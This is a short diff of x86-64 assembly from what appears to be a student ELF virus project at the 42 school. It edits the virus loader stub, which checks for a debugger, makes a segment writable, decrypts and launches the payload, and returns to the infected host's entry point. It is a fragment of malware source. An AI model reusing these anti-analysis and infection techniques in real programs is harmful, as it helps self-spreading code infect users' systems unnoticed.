@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/11 21:45:32 by anselme          ###   ########.fr        ;
+;    Updated: 2019/12/12 18:01:06 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -80,7 +80,7 @@ mark_below:
 	push r9                    ; save ptld size     [rsp + 24]
 	push r10                   ; save virus addr    [rsp + 16]
 	push r11                   ; save entry addr    [rsp + 8]
-	push rdx                   ; save key           [rsp]
+	push rdx                   ; save seed          [rsp]
 ;------------------------------; Show-off
 %ifdef DEBUG
 	mov rax, 0x00000a2e2e2e2e59
@@ -101,11 +101,6 @@ mark_below:
 	call detect_spy
 	test rax, rax
 	jnz return_to_client
-;------------------------------; fork virus
-	;mov rax, SYSCALL_FORK
-	;syscall
-	;test rax, rax
-	;jnz return_to_client
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
@@ -123,14 +118,8 @@ mark_below:
 
 	call decypher
 ;------------------------------; launch virus
-	mov rdi, rdx
+	mov rdi, [rsp]             ; get seed
 	call virus
-;	add rsp, 48
-;	pop r14
-;	pop rdx
-;	mov rdi, 0
-;	mov rax, SYSCALL_EXIT
-;	syscall
 ;------------------------------; return to client entry
 return_to_client:
 	mov r11, [rsp + 8]         ; get entry addr
